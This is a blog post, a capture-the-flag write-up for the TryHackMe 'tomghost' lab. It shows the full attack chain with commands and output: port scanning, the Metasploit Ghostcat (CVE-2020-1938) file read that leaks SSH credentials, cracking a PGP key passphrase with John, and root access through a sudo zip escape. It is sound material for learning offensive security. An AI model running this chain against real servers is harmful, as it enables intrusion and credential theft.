---
layout: post
title:  "THM Write-Up tomghost"
summary: Write-Up to the TryHackMe Machine tomghost
author: utnelson
date: '2022-02-10 10:35:23 +0530'
category: ['thm','write-up', 'easy']
thumbnail: /assets/img/posts/ghost_title.png
keywords: ghostcat, thm, box, easy, write-up, walkthrough
permalink: /blog/write-up-ghostcat/
---
Machine: [https://tryhackme.com/room/tomghost](https://tryhackme.com/room/tomghost)
## Enumeration

```console
root@machine:~$ nmap -sC -sV 10.10.114.227
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-10 12:55 CET
Nmap scan report for localhost (10.10.114.227)
Host is up (0.044s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-title: Apache Tomcat/9.0.30
|_http-favicon: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.93 seconds
```

Nothing special on the website. So I inspected the `8080/tcp` port with `Apache Jserv (Protocol v1.3)`.  

After a short google session i found a exploit [CVE-2020-1938](https://www.exploit-db.com/exploits/48143).

Let's run metasploit for that:

```console
                                                  
 _                                                    _
/ \    /\         __                         _   __  /_/ __
| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \
| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|
|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_
      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\


       =[ metasploit v6.1.27-dev                          ]
+ -- --=[ 2196 exploits - 1162 auxiliary - 400 post       ]
+ -- --=[ 596 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: View missing module options with show 
missing

msf6 > search ghostcat

Matching Modules
================

   #  Name                                  Disclosure Date  Rank    Check  Description
   -  ----                                  ---------------  ----    -----  -----------
   0  auxiliary/admin/http/tomcat_ghostcat  2020-02-20       normal  Yes    Apache Tomcat AJP File Read


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/admin/http/tomcat_ghostcat

msf6 > use 0
msf6 auxiliary(admin/http/tomcat_ghostcat) > options

Module options (auxiliary/admin/http/tomcat_ghostcat):

   Name      Current Setting   Required  Description
   ----      ---------------   --------  -----------
   AJP_PORT  8009              no        The Apache JServ Protocol (AJP) port
   FILENAME  /WEB-INF/web.xml  yes       File name
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT     8080              yes       The Apache Tomcat webserver port (TCP)
   SSL       false             yes       SSL

```

Only insert the `RHOSTS` with the target IP. And `run` it.  

```console
Result:
...
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
	skyfuck:{secret password}
  </description>

</web-app>
...
```

Nice. we found some creds `skyfuck:8730281lkjlkjdqlksalks`
## Foothold

ssh into the machine
```console
root@machine:~$ ssh skyfuck@10.10.114.227
The authenticity of host '10.10.114.227 (10.10.114.227)' can't be established.
ECDSA key fingerprint is SHA256:hNxvmz+AG4q06z8p74FfXZldHr0HJsaa1FBXSoTlnss.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.114.227' (ECDSA) to the list of known hosts.
skyfuck@10.10.114.227's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-174-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

skyfuck@ubuntu:~$
```

```console
skyfuck@ubuntu:~$ ls -la
total 928
drwxr-xr-x 4 skyfuck skyfuck   4096 Feb 10 04:19 .
drwxr-xr-x 4 root    root      4096 Mar 10  2020 ..
-rw------- 1 skyfuck skyfuck    136 Mar 10  2020 .bash_history
-rw-r--r-- 1 skyfuck skyfuck    220 Mar 10  2020 .bash_logout
-rw-r--r-- 1 skyfuck skyfuck   3771 Mar 10  2020 .bashrc
drwx------ 2 skyfuck skyfuck   4096 Feb 10 04:08 .cache
drwx------ 2 skyfuck skyfuck   4096 Feb 10 04:19 .gnupg
-rw-r--r-- 1 skyfuck skyfuck    655 Mar 10  2020 .profile
-rw-rw-r-- 1 skyfuck skyfuck    394 Mar 10  2020 credential.pgp
-rw-rw-r-- 1 skyfuck skyfuck 136707 Feb 10 04:20 ghostcat.txt
-rwxrwxr-x 1 skyfuck skyfuck 764159 Feb 10 01:48 linpeas.sh
-rw-rw-r-- 1 skyfuck skyfuck   5144 Mar 10  2020 tryhackme.asc
```

in the home dir are two interesting looking file `tryhackme.asc` and `credential.pgp`. Download the to your local machine.  

Run `gpg2john` for getting the hash. And crack the passphrase with the wordlist `rockyou.txt`

```console
root@machine:~$ gpg2john tryhackme.asc > hash

File tryhackme.asc

root@machine:~$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
{secret password}        (tryhackme)
1g 0:00:00:00 DONE (2022-02-10 13:39) 6.666g/s 7146p/s 7146c/s 7146C/s {secret password}
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
Nice it worked. So You can decrypt the `credential.pgp` with that.  
Import the key with inserting the found passphrase.
```console
root@machine:~$ gpg --import tryhackme.asc 
gpg: key 8F3DA3DEC6707170: "tryhackme <stuxnet@tryhackme.com>" not changed
gpg: key 8F3DA3DEC6707170: secret key imported
gpg: key 8F3DA3DEC6707170: "tryhackme <stuxnet@tryhackme.com>" not changed
gpg: Total number processed: 2
gpg:              unchanged: 2
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
```
Decrypt the text.
```console
root@machine:~$ gpg --output ./plaintext.txt --decrypt ./credential.pgp 
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 1024-bit ELG key, ID 61E104A66184FBCC, created 2020-03-11
      "tryhackme <stuxnet@tryhackme.com>"

root@machine:~$ cat plaintext.txt 
merlin:{secret password}    
```
Nice new Creds for the user `merlin`  
Let's change to him.

```console
skyfuck@ubuntu:~$ su merlin
Password: 
merlin@ubuntu:/home/skyfuck$ 
```
Change to home directory and there we go our `user.txt`

## Prev Escalation

First we check if there are any sudo commands we can execute. 
```console
merlin@ubuntu:~$ sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```

Quick look at [GTFOBins](https://gtfobins.github.io/gtfobins/zip/)

Run the following code:

```console
merlin@ubuntu:~$ TF=$(mktemp -u)
merlin@ubuntu:~$ sudo zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 31%)
# id
uid=0(root) gid=0(root) groups=0(root)
```

Boom! We got root. Cat the `root.txt` and you are done.


